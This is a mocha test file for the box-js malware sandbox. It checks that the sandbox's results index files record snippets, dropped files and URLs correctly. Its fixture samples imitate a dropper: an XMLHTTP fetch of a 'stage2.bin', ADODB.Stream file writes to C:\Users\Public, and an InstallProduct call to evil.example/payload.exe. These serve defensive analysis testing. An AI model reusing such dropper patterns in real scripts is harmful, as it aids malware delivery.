/* eslint-env mocha */

// snippets.json and resources.json are maps keyed by file name (the snippet's or the
// dropped resource's uuid name in the results dir). simpleStringify used to coerce every
// object to an array by numeric index, so both were written as lists of nulls, and
// resources.json was written BEFORE the new resource was recorded, so it always lagged
// one entry behind. These run box-js end to end and read the files back.

const assert = require("assert");
const {execFileSync} = require("child_process");
const fs = require("fs");
const os = require("os");
const path = require("path");

const boxDir = path.join(__dirname, "..");

function runSample(source) {
	const work = fs.mkdtempSync(path.join(os.tmpdir(), "boxjs-index-"));
	const sample = path.join(work, "sample.js");
	fs.writeFileSync(sample, source);
	execFileSync(process.execPath, [path.join(boxDir, "run.js"), sample, `--output-dir=${work}`], {
		stdio: "ignore",
		timeout: 60000,
	});
	const results = path.join(work, "sample.js.results");
	const read = (name) => JSON.parse(fs.readFileSync(path.join(results, name), "utf8"));
	return {work, results, read};
}

function dropResource(text, target) {
	return `var s = new ActiveXObject("ADODB.Stream"); s.Open(); s.Type = 2;
s.WriteText(${JSON.stringify(text)}); s.SaveToFile(${JSON.stringify(target)}, 2); s.Close();\n`;
}

describe("results index files", function() {
	this.timeout(90000);
	let run;
	before(function() {
		run = runSample(
			"var x = new ActiveXObject(\"MSXML2.XMLHTTP\");\n" +
			"x.open(\"GET\", \"http://example.invalid/stage2.bin\", false); x.send();\n" +
			dropResource("first", "C:\\Users\\Public\\a.txt") +
			dropResource("second", "C:\\Users\\Public\\b.txt")
		);
	});
	after(function() {
		fs.rmSync(run.work, {recursive: true, force: true});
	});

	it("writes snippets.json as an object keyed by snippet file name", function() {
		const snippets = run.read("snippets.json");
		assert.ok(snippets && typeof snippets === "object" && !Array.isArray(snippets),
			`expected an object, got ${JSON.stringify(snippets)}`);
		const names = Object.keys(snippets);
		assert.ok(names.length >= 1, "no snippets recorded");
		for (const name of names) {
			assert.ok(snippets[name] && typeof snippets[name].as === "string",
				`snippet ${name} has no 'as': ${JSON.stringify(snippets[name])}`);
			assert.ok(fs.existsSync(path.join(run.results, name)), `${name} not in results dir`);
		}
	});

	it("writes resources.json keyed by resource name, including the last resource", function() {
		const resources = run.read("resources.json");
		assert.ok(resources && typeof resources === "object" && !Array.isArray(resources),
			`expected an object, got ${JSON.stringify(resources)}`);
		const paths = Object.values(resources).map((r) => r.path).sort();
		assert.deepStrictEqual(paths, ["C:\\Users\\Public\\a.txt", "C:\\Users\\Public\\b.txt"]);
		for (const [name, res] of Object.entries(resources)) {
			assert.ok(fs.existsSync(path.join(run.results, name)), `${name} not in results dir`);
			assert.match(res.sha256, /^[0-9a-f]{64}$/);
		}
	});

	it("still writes arrays (IOC.json, urls.json) as arrays", function() {
		assert.ok(Array.isArray(run.read("IOC.json")));
		assert.deepStrictEqual(run.read("urls.json"), ["http://example.invalid/stage2.bin"]);
	});
});

describe("array index files", function() {
	this.timeout(90000);

	it("keeps every element when one is a function", function() {
		// copyWithoutCircularReferences drops function values, so bounding the copy by the
		// surviving key count cut the LAST element: urls.json lost the real URL.
		const run = runSample(
			"InstallProduct(function(){return 1;});\n" +
			"InstallProduct(\"http://evil.example/payload.exe\");\n"
		);
		try {
			const urls = run.read("urls.json");
			assert.ok(Array.isArray(urls));
			assert.ok(urls.includes("http://evil.example/payload.exe"), JSON.stringify(urls));
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});
